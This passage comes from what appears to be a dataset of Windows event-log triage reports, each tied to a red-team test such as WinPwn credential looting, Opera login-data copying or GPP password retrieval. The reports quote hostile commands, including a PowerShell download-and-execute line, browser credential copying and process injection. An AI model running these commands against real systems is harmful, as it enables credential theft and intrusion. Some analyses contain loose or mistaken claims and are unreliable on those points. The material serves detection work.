3. **Endpoint Protection**: Ensure endpoint security systems are updated and initiate a full scan for the detection and removal of potential malware.

4. **Monitoring and Alerting**: Implement monitoring of PowerShell activity and network connections to identify and alert on similar activities in real-time.

5. **Script Restriction Policy**: Consider implementing PowerShell execution policies via Group Policy to restrict or monitor script execution within the organization.

These steps will help to address the risks identified and safeguard against potential threats posed by any unauthorized PowerShell activities observed in the logs."
WinPwn - PowerSharpPack - Kerberoasting Using Rubeus,"The provided Windows event logs primarily contain information from Sysmon, Windows PowerShell, Security, System, and Application logs. Let's break down the significant findings:

1. **Sysmon Log Analysis:**
   - A PowerShell process (`powershell.exe`) with the command line execution of `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/master/scriptBinaries/Invoke-script.ps1')` and `Invoke-script -Command \""asreproast /format:hashcat /nowrap\""` is highly suspicious.
   - The command indicates the download and execution of a script from an external source, which is considered malicious as it potentially attempts to gather hashes for offline password attacks (asreproast).
   - The execution by `Server002\admin_test` with high integrity suggests a compromise at a higher privilege level, which demands immediate attention.

2. **PowerShell Log Analysis:**
   - The consistent log entries show that a PowerShell session was initiated with a command designed to execute a potentially harmful script.
   - The presence of `iex` (Invoke-Expression), especially with a web download combined with the command `asreproast`, directly aligns with reconnaissance or exploitation activities targeting Kerberos authentication.

3. **Security Log Analysis:**
   - The timestamp changes reflect no additional harmful activities related to the scope of our interest, mainly focusing on time sync issues.

4. **System Log and Application Log Analysis:**
   - These logs do not show any unusual or suspicious activity apart from the routine system operations involving time services and updates, which don't directly point to any compromise.

**Threat Assessment and Resolution:**
- **Malicious Activities Identified:** The execution of PowerShell downloading and running an external script for Kerberos ticket requests is a clear indicator of potentially malicious activity.
- **Compromise Indications:** The involvement of high-level processes and known exploitation tactics (power exploitation kernels) suggest a compromise.
  
**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
1. **Immediate Isolation:** Isolate the affected host (Server002) from the network to prevent further spread or data exfiltration.
2. **Credential Revocation:** Immediately reset passwords and revoke any administrator credentials that might have been exposed.

WinPwn - BrowserPwn,"Based on the analysis of the provided Windows event logs, here are the observations:

### Security Log:
- **Event ID 4616**: Time change events detected. These events are often normal but can be suspicious if correlated with unauthorized changes or activity. In this case, it appears to be a regular operation by `svchost.exe`, commonly used by legitimate Windows services.

### Application Log:
- **Security SPP and SecurityCenter Events**: These logs indicate standard operations of Windows defending applications. No suspicious behavior observed here.

### Sysmon Log:
- A series of process creation events for common system utilities such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `hostname.exe`. These commands are being executed under the context of `SERVER002\\admin_test`.
- **Event ID 1** (with Image: `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`): This log entry shows the execution of `powershell.exe` with the command line attempting to download and execute a script from a GitHub repository. This is an indicator of potentially malicious activity. The use of an external script, particularly from a URL, is suspicious and suggests an attempt to execute untrusted code on the system.

### System Log:
- Consistent with the Security Log, time-related events with `svchost.exe`. These entries are not inherently malicious without further context suggesting misuse or abnormality.

### Windows PowerShell Log:
- Multiple PowerShell events indicating the start and use of various PowerShell providers with a command line that attempts to execute a possibly malicious script hosted externally. The command line within PowerShell involves downloading and executing scripts from URLs. Such actions can be exploited for attacks like data exfiltration or establishing a command and control channel.

### Conclusion:
The logs indicate a potentially malicious activity involving the execution of a PowerShell command that attempts to download and execute a script from an external website. This behavior is generally not typical for most legitimate administrative scripts and suggests a risk of compromise through remote script execution.

**Resolution: MALICIOUS**: The presence of a PowerShell process downloading and executing scripts from an external source is a clear indicator of malicious behavior. Immediate actions include isolating the affected system, examining network connections and other hosts for similar activity, and conducting a full forensic analysis to understand the depth and breadth of the compromise.

**Guidance to Proceed**:
1. Isolate the affected system from the network to prevent further propagation or data exfiltration.
2. Conduct a thorough investigation into the specific script hosted on the external URL and its impact.
3. Review user accounts and access logs for unauthorized use.
4. Increase monitoring on other systems for similar suspicious activity.
5. Implement stricter network egress filtering to prevent unauthorized outbound traffic."
Stage Popular Credential Files for Exfiltration,"After thoroughly analyzing the provided logs, I've identified several entries that stand out as suspicious and may indicate potential malicious activity:

1. **Privilege Escalation (EventID: 4672 in Security log)**
   - User `admin_test` was granted a broad set of high-level privileges, including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, `SeBackupPrivilege`, and others. These privileges can be used for advanced operations and could be exploited maliciously.

2. **Suspicious PowerShell Activity (Sysmon and PowerShell logs)**
   - The PowerShell command executed by `admin_test` appears to be gathering potentially sensitive data from web browsers like Firefox, Chrome, Opera, and Edge. This includes copying libraries and login data files to a temporary directory, which is later compressed into a zip file:
     - Browser credential files (`key4.db`, `logins.json`, etc.) from Firefox, Chrome, Opera, and Edge are being targeted.
     - This activity, especially in conjunction with the elevated privileges, suggests potential credential theft or data exfiltration efforts.

3. **Process Creation with `wevtutil.exe` and `conhost.exe` (Sysmon logs)**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` appear repeatedly in the Sysmon logs. While `conhost.exe` is a typical console window host process, `wevtutil.exe` can be used to clear or query event logs, which could indicate that someone is trying to cover their tracks or gather additional information stealthily.

4. **Network Logon Attempts (EventID: 4624 in Security log)**
   - Logon Type 3 indicates network logons, which are typical but, in conjunction with other suspicious activities, could be examined further to determine if they were expected and legitimate.

**Conclusion:**
The combination of privilege escalation, unusual PowerShell script execution aimed at extracting browser credentials, and potential log tampering through `wevtutil.exe` strongly suggests potentially malicious activity.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- **Immediate Actions:**
  - Isolate the affected system (`Server002`) to prevent further data exfiltration or lateral movement within the network.
  - Conduct a detailed forensic analysis of the system to determine the full scope and source of compromise.
  - Investigate `admin_test` account for unauthorized use; consider password reset and additional account security measures.
  - Review network logs and correlate them with the timeframe around the suspicious activity for signs of data exfiltration or unauthorized connections.

- **Longer-term Measures:**
  - Implement enhanced monitoring and alerting for the use of PowerShell, particularly scripts that access credential stores.
  - Review and minimize privileges in accordance with the principle of least privilege for all users.
  - Deploy additional security training and awareness to staff highlighting the risks associated with credential exposure and PowerShell misuse.
"
WinPwn - Loot local Credentials - Wifi Credentials,"After analyzing the provided Windows event logs, the following observations and assessments can be made:

### Windows Security and Sysmon Logs:
1. **Security log (EventID: 4616):** The events recorded are related to time changes, performed by `svchost.exe` running under the `LOCAL SERVICE` account. This activity, in isolation, might be normal depending on the system's configuration (e.g., time synchronization with an NTP server). However, frequent and unexplained time changes can be indicative of malicious activity, such as attempts to alter timestamps for other malicious events.

2. **Sysmon log:**
   - The logs indicate that multiple executions of `wevtutil.exe` and `conhost.exe` occurred in rapid succession. While both are legitimate Windows binaries, `wevtutil.exe` (used for managing Windows Event Logs) and `conhost.exe` (Console Window Host) could be leveraged in attacks, such as clearing logs or interacting with command-line interfaces.
   - High Integrity Level process executions and multiple uses of `whoami.exe`, `hostname.exe`, and `PowerShell.exe` with unusual command lines and network activities are notable. 

### Windows PowerShell Logs:
- There are clear indicators of suspicious PowerShell usage. The command line shows attempts to download and execute a script from an external source (`GitHub`). This script fetches what appears to be a PowerShell script (`script.ps1`) and runs a module named `wificreds`, targeting credential theft without leaving traces on the console (`-consoleoutput -noninteractive`). This behavior is consistent with known patterns of malicious PowerShell usage.

### System Logs:
- Time synchronization and kernel events appear standard, aligning with typical system processes for time management. 

### Application Logs:
- Windows Defender is noted to be running in an active state. The entries related to `edgeupdate` suggest frequent starting and stopping of the Microsoft Edge Update service, which in itself might be benign if updates are being managed automatically.

### Assessment:
Based on the above findings, the most concerning aspect is the repeated execution of potentially malicious PowerShell commands with network activity pointing to external script sources and potential credential harvesting efforts.

### Final Resolution:
- **MALICIOUS -** The logs provide strong indicators of malicious activity, notably the suspicious PowerShell activity, suggesting an active compromise.
  
### Recommended Actions:
- Immediately investigate and potentially isolate the affected host (Server002) to prevent further unauthorized access or data exfiltration.
- Conduct a full review and analysis of any changes made to system configurations and other logs for corroboration.
- Perform a review and cleanup of downloaded/introduced scripts and ensure no persistent threats remain in the environment.
- Review and enhance network and endpoint security postures to detect, prevent, and mitigate future similar incidents."
Trigger an authenticated RPC call to a target server with no Sign flag set,"Based on an analysis of the provided Windows event logs, several entries may warrant further investigation:

1. **PowerShell Activity**:
   - The `PowerShell` logs show multiple events indicating that `powershell.exe` was executed with a particular command: `{rpcping -s 127.0.0.1 -e 9997 /a connect /u NTLM}`, redirecting output to `$Null`. This command uses `rpcping` to test remote procedure call functions.
   - The execution of `rpcping` locally (`127.0.0.1`) and with NTLM authentication might indicate a benign usage for testing connections, but it’s unusual for standard operations. Such activity could potentially be part of network reconnaissance or lateral movement, commonly seen in malicious operations.

2. **Sysmon Log Activity**:
   - The `Sysmon` log shows the execution of administrative commands (`wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `powershell.exe`) by the user `SERVER002\admin_test`. While these could be part of legitimate administrative activities, their concurrent execution within a short timeframe raises a red flag.
   - Specific highlighting goes to the `wevtutil.exe` command, which is a tool that is used for managing event logs and can be utilized in certain offensive security techniques to cover tracks.
   - The execution environment suggests activities potentially involving privilege escalation or system reconnaissance.

3. **Edge Update and Other System Activities**:
   - There are multiple entries about `MicrosoftEdgeUpdate.exe`, which appears to be related to the update processes for Microsoft Edge. These activities, logged with the user `NT AUTHORITY\SYSTEM`, are typically benign if seen regularly as part of automatic updating. Given the high volume in a short timeframe, if they are not regularly scheduled updates, this warrants validation.

4. **Lack of Security Logs**:
   - The absence of security log entries in the dataset provided raises some concerns. Security logs are critical for tracking authentication and authorization events, which might reveal unauthorized access attempts. Their absence can indicate either an issue with log collection or potential tampering.

### Assessment:

- **Indicators of compromise** are present in the execution of complex PowerShell commands with network communication features (`rpcping`), coupled with other administrative tools executing quickly and successively in a short timeframe.

- **Risk:** The immediate risk might involve unauthorized access or privilege escalation activities trying to perform reconnaissance or other potentially malicious operations.

### Recommendation:

1. **Resolution**: **SUSPICIOUS** – This activity requires further investigation.
2. Actions to take:
   - **Investigate PowerShell Activity**: Review the circumstances and context around the PowerShell commands, especially the usage of `rpcping`.
   - **Validate Administrative Access**: Ensure all mentioned administrative commands are legitimate and sanctioned. Verify the purpose and necessity of `wevtutil.exe` usage.
   - **Check for Malicious Patterns**: Correlate these events with known Indicators of Compromise (IOCs) and perform a threat intelligence check to validate.
   - **Verify Edge Updates**: Confirm that Edge update activities correspond to genuine updating schedules. Unexpected execution of these programs could imply malicious intent.
   - **Review Security Log Collection**: Ensure that Security event logs are being captured and stored correctly to avoid critical information being overlooked.

By treating the logs as suspicious, the proper due diligence can be undertaken to rule out potential threats. If malicious activity is confirmed, escalate to incident response processes."
Request A Single Ticket via PowerShell,"**Detailed Analysis of the Logs:**

1. **Unusual Process Execution:**
   - The Sysmon logs indicate multiple instances of `powershell.exe` being executed with command-line arguments that appear to involve working with Kerberos tokens. The use of PowerShell with a command involving Kerberos tokens is typically associated with legitimate administrative tasks; however, it may also suggest an attempt to engage with network authentication in potentially malicious ways, such as attempting to impersonate users or obtain unauthorized access.
   - The process `C:\\Windows\\System32\\whoami.exe` was executed, which by itself is not malicious but can be used by attackers to gather information about the current user context.

2. **Frequent Use of Process Utilities:**
   - Numerous executions of `conhost.exe` correlate with console activities and are often seen in legitimate system operations but can be used to tunnel commands or hide malicious activities.
   - The `wevtutil.exe` process was executed multiple times. This utility can be used by attackers to clear event logs or query event logs, both of which could be a part of anti-forensics activity.
   
3. **Recurring Edge Update Processes:**
   - The logs contain extensive entries of Microsoft Edge Update processes. While frequent updates are typical behavior for software, the log events conspicuously involve numerous process creations within a condensed time frame but are likely part of routine software update checks and actions.
   - Most processes are spawned by a parent with `NT AUTHORITY\SYSTEM` user, maintaining a high integrity level, which can be part of legitimate automatic system updates.

4. **PowerShell Logs:**
   - The PowerShell logs confirm the execution of PowerShell scripts using `Add-Type` to involve assemblies related to identity management. This is a legitimate PowerShell capability but may be used in illicit network-oriented operations.

**Assessment and Conclusion:**

- The logs detail activities that could potentially lead to suspicious or malicious behavior, especially the `powershell.exe` invocation with Kerberos-related parameters which could indicate Credential Theft tactics.
- However, these processes, in the absence of any confirmed harmful intent or results and considering the possible context of legitimate administrative or automated updates, do not definitively conclude malicious actions.

**Resolution: SUSPICIOUS**

**Guidance:**

- **Further Investigation:** Thoroughly investigate the context and user actions surrounding the PowerShell commands. Cross-reference other logs, such as system and user authentication logs, for unusual patterns or unauthorized access attempts.
- **Monitoring:** Increase the level of monitoring around `powershell.exe` executions on the server for unusual patterns of behavior, command-line arguments, or unauthorized usage.
- **Credential Security:** Check the logs for any potential exposure of sensitive data or credentials. Implement additional security measures for accessing Kerberos tokens and ensure regular auditing of credential access.
- **Patch and Update Management:** The frequent Edge Update processes should be reviewed to assure that they stem from legitimate sources and actions. Ensure the software patch management system is secure and non-tampered.

By following these steps, the environment's security posture can be evaluated and adjusted as needed, potentially mitigating any overlooked threat actor activities."
"WinPwn - Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials","### Detailed Analysis of the Log Entries

1. **Consistent Use of Elevated Commands:**
   - Multiple instances of Sysmon Event ID 5 show command-line utility processes (e.g., `wevtutil.exe` and `conhost.exe`) executed by the user `SERVER002\admin_test` in quick succession. `wevtutil.exe` is used for managing event logs, which is not typically run back-to-back in a rapid sequence during regular administrative tasks.
   - `conhost.exe` is also seen alongside `wevtutil.exe`, suggesting scripting activity or automation attempts that might not be typical behavior for `admin_test`.

2. **PowerShell Usage Analysis:**
   - A Sysmon Event ID 1 highlights a PowerShell execution that downloads and executes a script from `https://raw.githubusercontent.com`, using `iex (new-object net.webclient).downloadstring()`. This execution method is commonly associated with fileless malware attacks or unauthorized script execution. The specific command-line used indicates fetching a script, which is a strong indicator of potentially malicious activity.

3. **Time Change Events in Security Logs:**
   - Security logs reveal Event ID 4616, which indicates a system time change initiated by `svchost.exe`. This can sometimes be indicative of an attacker attempting to manipulate or evade time-based security controls or audits. However, there is no direct evidence linking this to malicious activity.

4. **Edge Update Activity:**
   - Multiple entries from Sysmon indicate updates or installations being managed by `MicrosoftEdgeUpdate.exe`. This is likely benign, likely representing routine software maintenance or updates. However, the unusually high frequency and concentration may warrant a follow-up inquiry to ensure no rogue processes are leveraging legitimate installers.

5. **Windows Defender Status:**
   - The application log indicates that Windows Defender is active with its state as `SECURITY_PRODUCT_STATE_ON`, which is a normal state.

6. **Microsoft Edge Update Logs:**
   - Many instances of Microsoft Edge updates and installations appear. These updates frequently occur with system privilege, suggesting legitimate software updates. The frequency and regularity suggest scheduled update checks rather than suspicious attempts to mask malicious activity.

### Assessment of the Situation

The primary concern identified here is the use of PowerShell to download and likely execute a script via `iex` from a URL. This behavior is classically associated with unauthorized and potentially harmful script execution within the system. While the Edge update logs are generally benign, they warrant monitoring to ensure no additional entities are masquerading as legitimate processes.

### Resolution

Based on the analysis above, the resolution is:

**MALICIOUS**

### Guidance on How to Proceed

1. **Immediate Response:**
   - Isolate the affected host (`Server002`) from the network to prevent further potential exploitation or exfiltration.
   - Disable the user account `admin_test` in case of compromise credentials.

2. **Investigation:**
   - Conduct a deeper forensic analysis on the host to determine the entry point and intent of the PowerShell script.
   - Review related network logs to identify any external connections during the time PowerShell script execution occurred.

3. **Remediation:**
   - Remove any identified malicious or unauthorized software or scripts.
   - Apply any necessary security patches and ensure PowerShell logging is configured for detailed tracking in the future.

4. **Post-Incident Actions:**
   - Reset credentials for `admin_test` and evaluate other accounts for similar activity.
   - Educate users and administrators on secure PowerShell usage and the dangers of executing scripts from untrusted sources."
Hook PowerShell TLS Encrypt-Decrypt Messages,"Based on the analysis of the provided logs, there are several indicators of potentially suspicious and potentially malicious activities:

1. **PowerShell Usage**: There are multiple instances of PowerShell being executed, which itself is not unusual. However, the specific command line usage observed is concerning:
   - The command includes `mavinject $pid /INJECTRUNNING`, which is a known technique for process injection. This is often used by attackers to run code in the context of another process.
   - The use of `Invoke-WebRequest` to access a URL (`https://www.example.com`) within the command further suggests that PowerShell is potentially being used for data exfiltration or to download further payloads.

2. **Security Privileges**: The `admin_test` user is observed to have a number of elevated privileges (`SeDebugPrivilege`, `SeLoadDriverPrivilege`, etc.) typically associated with administrative activities. However, without the context of the user's typical roles and responsibilities, it's difficult to immediately determine if this should be considered abnormal.

3. **Time Manipulation Event**: 
   - A series of events with `EventID: 4616` in the security log shows that the system time was altered. Such actions can be used to cover tracks by confusing time-based monitoring or logging systems.

4. **Unusual Process Execution**:
   - The execution of processes like `conhost.exe` and `wevtutil.exe` in rapid succession may be viewed as potential indicators of unusual activity given the context observed here. However, without additional context, these alone are not definitively indicative of malicious activity.

5. **DLL Injection and Data Handling**:
   - The file path in the PowerShell command suggests DLL injection from a temp directory, which is a common place for malicious activities due to its writable nature for users.

Given the combination of process injection, internet communications to a remote host, time manipulation, and elevated command execution via PowerShell, these logs suggest the possibility of a malicious compromise.

**Final Assessment**: **MALICIOUS**
- The presence of process injection and command-line evidence of attempts to download further code or exfiltrate data signals strong indicators of potentially malicious activity.

### Recommendations:
1. **Immediate Response**:
   - Isolate the affected host (Server002) from the network to prevent potential lateral movement and further communications with external sites.
   - Conduct a forensic analysis of the system to capture memory dumps and disk images for further examination.

2. **Detection and Monitoring**:
   - Implement enhanced monitoring for process injections and unusual PowerShell activity across systems.
   - Use intrusion detection systems (IDS) to flag similar PowerShell command patterns.

3. **Security Policy and Education**:
   - Review and potentially tighten user privilege policies to restrict administrative privileges to essential personnel only.
   - Conduct user awareness training to recognize signs of phishing and unauthorized activities that could lead to similar initial compromise vectors.

4. **Patch and Update**:
   - Ensure all systems have the latest security patches applied, as attackers may be exploiting known vulnerabilities. 

Acting swiftly to isolate and analyze the system while enhancing the monitoring and detection capabilities will help ensure that potential damage is limited, and similar future incidents can be mitigated more effectively."
Azure - Search Azure AD User Attributes for Passwords,"Upon analyzing the provided Windows event logs, we have identified several noteworthy aspects pertaining to potential malicious activity, particularly within the Windows PowerShell and Sysmon logs. Here’s a detailed breakdown of the observations:

### Windows PowerShell Log:
1. **Import-Module and Credential Handling:**
   - The PowerShell command logs show the Import-Module `msonline` followed by commands that create a `PSCredential` object using an explicit conversion of a password string to a secure string.
   - The command then connects to `MsolService` and iterates over retrieved users, searching for properties containing ""password,"" and appends these to a file `data.005Test1.txt` in the temporary directory. The potential for exporting password-related data is deemed suspicious.

2. **File Output:**
   - Sensitive information is being redirected to a file in the `%temp%` directory. This includes looping through properties related to passwords. Writing sensitive information like password-related data to file raises red flags.

### Sysmon Log:
1. **Process Execution:**
   - The Sysmon logs contain numerous entries related to the execution of `powershell.exe` initiated by the user `SERVER002\admin_test`. This is consistent with the PowerShell activity noted above.
   - Processes like `wevtutil.exe` and `whoami.exe` are executed, which could be normal but warrant a closer look in this context.

2. **High Integrity Level:**
   - The PowerShell sessions and processes are executed with a high integrity level, suggesting elevated permissions, which could facilitate potential privilege exploitation.

3. **Conhost.exe Processes:**
   - There are multiple instances of `conhost.exe`, a legitimate Windows process, but frequent invocation often alongside elevated tasks warrants scrutiny to rule out abuse.

### Assessment:
- The usage pattern observed, particularly the extracting and logging of user credential-like data, is not typical of standard user behavior or administrative tasks therefore it's suspicious.
- The potential collection and exfiltration of credential information suggest possible credential harvesting activities.

### Resolution: SUSPICIOUS

### Guidance on How to Proceed:
1. **Immediate Investigation:**
   - Investigate the account `SERVER002\admin_test` for unauthorized activities.
   - Check for any anomalous login attempts or privilege escalations related to this account.
   
2. **File Analysis:**
   - Locate and examine the file `data.005Test1.txt` in the `%temp%` directory for any sensitive information.
   - Verify file creation timestamps and correlate with suspicious user actions.

3. **Containment and Monitoring:**
   - Review and potentially contain the server `Server002` from the network if unsanctioned access is confirmed.
   - Implement enhanced logging and monitor the PowerShell activities for any further suspicious behavior.

4. **Policy Review:**
   - Reinforce security policies, focusing on the use of PowerShell logging and user training.
   - Consider applying strict permission controls and Just-In-Time (JIT) privilege escalation where applicable.

5. **Threat Hunting:**
   - Initiate a broader threat hunting initiative to search for similar patterns of behavior across the network environment.

This situation requires further investigation to confirm potential data compromise and mitigate risks associated with potential credential harvesting."
Run DSInternals Get-ADReplAccount,"Upon analyzing the provided Windows event logs, several notable activities were identified that could potentially indicate suspicious behavior:

### PowerShell Logs:
- Multiple PowerShell script block logs indicate the execution of a script using the command `powershell.exe & {Get-ADReplAccount -All -Server $ENV:logonserver.TrimStart(\""\\\"")}`.
- This command suggests an attempt to enumerate or interact with Active Directory replication accounts, which could be utilized for reconnaissance within an Active Directory environment.
- The use of environmental variables like `$ENV:logonserver` is often seen in scripts designed to dynamically interact with different system configurations.

### Sysmon Logs:
- Several Sysmon process creation events show the execution of typical system processes such as `conhost.exe`, `whoami.exe`, `powershell.exe`, and `wevtutil.exe` from directories like `C:\\Windows\\System32\\`.
- The user responsible for most activities is labeled as `SERVER002\\admin_test`, which seems like a potentially temporary or test administrative account.
- The specific focus on PowerShell process execution corroborates the PowerShell event logs mentioned above.

### Suspicious Indicators:
1. **PowerShell Command**: The `Get-ADReplAccount` command is suspicious if not initiated by a legitimate admin task or automated script as it targets Active Directory data.
2. **Tool Usage**: Execution of `whoami.exe`, `hostname.exe`, and `wevtutil.exe` under the aforementioned account suggests system reconnaissance or privilege validation activities.
3. **Account Used**: The account `admin_test` raises suspicion due to its atypical naming convention, hinting at either a test account being used in a production or sensitive environment, or an account set up temporarily for specific tasks.

### Assessment:
The combination of accessing Active Directory through PowerShell, along with running system reconnaissance commands, suggests that either an administrator is performing maintenance or checking configurations, or these actions might indicate the presence of an adversary conducting reconnaissance.

### Final Resolution:
- **SUSPICIOUS**: The activity in the logs indicates behavior that is unusual and warrants further investigation. The use of a test account with high privileges to perform potentially sensitive operations without additional context could suggest inappropriate usage. It is recommended to:
  - Verify the legitimacy and intended usage of the `admin_test` account.
  - Cross-check against scheduled admin tasks or scripts to rule out routine operations.
  - Increase monitoring on this and similar accounts to detect any further unusual activity.
  
Overall, while there's no conclusive evidence of malicious activity, the nature of the actions performed is non-standard and merits further oversight to ensure no security breaches occur."
Simulating access to Opera Login Data,"**Detailed Analysis of the Logs:**

Upon reviewing the logs, the following potential indicators of malicious activity were identified:

1. **PowerShell Commands:**
   - The logs indicate the execution of a PowerShell command aimed at copying a file, specifically:
     ```
     Copy-Item ""$env:APPDATA\\Opera Software\\Opera Stable\\Login Data"" -Destination ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles""
     ```
   - This action is noteworthy because it involves accessing the Opera browser's login data, which may include saved passwords and other sensitive information, and copying it to a seemingly arbitrary location outside the typical user directories.

2. **User Context and Execution Environment:**
   - The `powershell.exe` and associated operations are executed under the user `SERVER002\\admin_test` from `C:\\Windows\\System32`, which is a legitimate directory for such applications. However, this does not inherently rule out misuse when combined with suspicious activities as described.
   - The use of `powershell.exe` with specific command-line argument common in file extraction and data exfiltration activities suggests potential malicious behavior or at least policy violation.

3. **No Apparent Logs in Other Channels:**
   - There are no events in the Application, Security, or System logs indicating compatible legitimate operations, nor are there scheduled tasks or legitimate scripts documented to justify such behavior during the reported timeframe.

4. **Sysmon Logs:**
   - The Sysmon logs capture several executions related to PowerShell and related console processes, although interactions such as `whoami.exe` and `hostname.exe` do not directly contribute to suspicious activity themselves, they provide no clear context that might legitimize the `Copy-Item` PowerShell observed.

**Assessment of the Situation:**

Considering the sensitive nature of the data copied and the use of unsanctioned command-line activity to access browser login data, I identify this activity as potentially malicious. These behaviours often align with data harvesting or exfiltration techniques, common in the initial phases of security breaches.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**

1. **Immediate Actions:**
   - Isolate the affected host `Server002` from the network to prevent further potential data exposure or exfiltration.
   - Perform a full forensic investigation on the host to determine if any unauthorized access or further data manipulation occurred.
   - Change all credentials and closely monitor accounts that may have had stored credentials in the Opera browser.

2. **Long-term Actions:**
   - Review and audit permissions and the execution of administrative tools such as PowerShell scripts.
   - Implement monitoring and alerting for specific PowerShell activities, especially those related to accessing sensitive directories.
   - Reinforce security guidelines and conduct training sessions for users to mitigate risks associated with such activities in the future.

By following these steps, the organization may better safeguard against and respond to potential breaches related to similar activities."
Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using list),"Upon analysis of the provided Windows event logs, a few observations and assessments can be made:

### Security Log Analysis

- All events in the security logs have EventID 5379, which relates to Credential Validation Failure. The `ReturnCode` of `3221226021` indicates a status of ""Logon failure: unknown user name or bad password.""

- The repeated log entries in the security logs pertain to attempts to access Microsoft account services, specifically `MicrosoftAccount:user=02txoixylodcstop`. However, the process does not seem to succeed in retrieving any credentials (`CountOfCredentialsReturned` is 0).

### Windows PowerShell Log Analysis

- Each PowerShell event indicates the execution of `appcmd.exe` commands for listing application pools, which is commonly associated with managing IIS (Internet Information Services) web services. While PowerShell usage is normal, simultaneous enumerations of application pools might suggest reconnaissance activity.

### Sysmon Log Analysis

- Multiple processes initiated by the user `SERVER002\\admin_test` include typical system utilities like `windowsPowerShell.exe`, `conhost.exe`, and `wevtutil.exe`.

- The execution commands for system files such as `HOSTNAME.EXE`, `whoami.exe`, and `conhost.exe` suggest an operational context or possible user activity exploration but do not immediately suggest compromise.

- Use of `whoami.exe` and `hostname.exe` could be part of normal administrative audits or checks.

### Assessment and Conclusion

Considering all the log entries, the activities do not definitively indicate malicious behavior. However, they can be considered potentially suspicious, specifically due to:

- Repetitive failed credential attempts in Security logs.
- Usage patterns in PowerShell logs that suggest possible probing activities for IIS configuration.

While no concrete signs of malicious activity have been definitively identified, the orchestration of systems utilities and application pool enumeration potentially suggests preparation or testing phases often observed before a breach. Therefore, given the current evidence, the resolution is **SUSPICIOUS**. 

### Recommendations

1. **Monitoring**: Intensify logging and monitoring activities around the user `admin_test`. Look for further suspicious activity or escalation attempts.
   
2. **Credential Checks**: Ensure that the credential user `02txoixylodcstop` is legitimate and investigate why credentials were repeatedly requested and failed.

3. **Review and Confirm User Activities**: Verify with appropriate teams or individuals whether the observed PowerShell commands align with expected administrative tasks.

4. **Security Posture Review**: Conduct a review to ensure that security measures are in place for privilege management, particularly with PowerShell usage and IIS configurations.

5. **Potentially Run a Threat Hunt**: Proactively check the system for indicators of compromise related to known patterns of IIS exploitation or credential attacks.

GPP Passwords (Get-GPPPassword),"Upon reviewing the provided Windows event logs, a potential indicator of malicious activity has been identified. Here are some details:

### Suspicious Findings
1. **PowerShell Usage**: 
   - Multiple events show the use of `PowerShell.exe` with a script named `Get-GPPPassword.ps1` executed. This script is known for attempting to retrieve Group Policy Preferences passwords, which can be an indication of credential compromise attempts.
   - The script execution is initiated by `SERVER002\admin_test`, which could denote a legitimate user or be used maliciously if compromised. The command line context is observed in the Sysmon log entries with GUIDs such as `dbf410b3-a3c0-671e-da00-000000003900`.

2. **User and Process Behavior**:
   - The continuous instances of PowerShell execution in quick succession and under high integrity level suggest an automated activity rather than manual user tasking.
   - Processes such as `wevtutil.exe`, `conhost.exe`, and other utility executables are running frequently in the same timeframe as the PowerShell scripts, which may be a part of or related to the same activity.

3. **Security Log**:
   - Multiple entries of EventID 4624 (Logon) with Logon Type 5 (Service Startup) and EventID 4672 (Special Privileges Assigned) for SYSTEM indicate processes or services are being started up with elevated privileges, consistent with potential privilege escalation or persistence.

### Assessment
- The presence and usage of the `Get-GPPPassword.ps1` script, along with consistent high integrity level execution of PowerShell, are strongly indicative of potential malicious activity.
- The combination of these logs suggests a potential compromise scenario targeting credential theft or privilege escalation.

### Recommendation
- **Resolution: MALICIOUS**
   - Immediate action should be taken to investigate the source of the PowerShell script and assess whether it was executed as part of routine administrative activity or if unauthorized access was involved.
   - Review user `admin_test` account for any unauthorized access signs. Consider reset of credentials if any suspicion arises.
   - Analyze network traffic during the timeframe of these events for potential exfiltration.
   - Implement mitigations such as restricting PowerShell script execution, monitoring high-integrity processes, and enhancing credential protection mechanisms.

Further investigation is needed to determine the full scope of potential compromise and to implement necessary remediations."
Export Root Certificate with Export-PFXCertificate,"Upon analyzing the provided Windows event logs, I have found evidence of several activities that require further examination. Here is a detailed breakdown of the investigation:

### Suspicious or Anomalous Behavior:
1. **PowerShell Activity**:
   - Several PowerShell events are recorded, showing the execution of scripts using commands to create and export a self-signed certificate. The command involved includes creating a certificate and exporting it as a PFX file with a hard-coded password (`ConvertTo-SecureString -String ""file"" -Force -AsPlainText`). This pattern is often associated with attempts to compromise the system’s security or prepare for further malicious activity.

2. **Security Log Activity**:
   - The logs document cryptographic operations involving a user (`admin_test`) who interacts with the `Microsoft Software Key Storage Provider` using RSA algorithms. The repetitive nature and timing immediately following the PowerShell activity suggest a correlation that warrants further investigation.

3. **Sysmon Logs**:
   - The Sysmon log details include the creation of several processes, such as `wevtutil.exe` and `conhost.exe`, which are typically benign. However, the presence of `whoami.exe` and PowerShell scripts suggests privilege checks or enumeration activities possibly intended to gather information on user accounts.

4. **Application Logs**:
   - Processes and updates related to Microsoft Edge are logged, indicating routine system maintenance activities. However, it's crucial to validate that these updates came from legitimate sources, given the potential for masquerading in update processes.

### Indicators of Potential Malicious Activity:
- **PowerShell Command Use**: The command execution via PowerShell that involves certificate manipulation is a red flag. Such actions are common in attacks aiming to establish persistence or maneuver within a compromised network.
  
- **Crypto Key Operations**: Created and manipulated keys in the Security logs might indicate unauthorized or suspicious encryption/decryption activity, especially when linked to unexpected PowerShell activities.
  
- **Process Creation Patterns**: The launch of `whoami.exe` and PowerShell in quick succession could suggest reconnaissance or privilege escalation attempts by someone who gained access with sufficient privileges.

### Assessment:
Based on the patterns observed, particularly the PowerShell activity and its subsequent system interactions, these actions could indicate an initial stage or preparatory phase of a cyber attack.

### Resolution: **SUSPICIOUS**
Given the nature of the PowerShell commands and cryptographic operations, the events are marked as **SUSPICIOUS**. There are potential indicators of compromise that, while not definitive of an attack, merit further investigation.

### Recommended Actions:
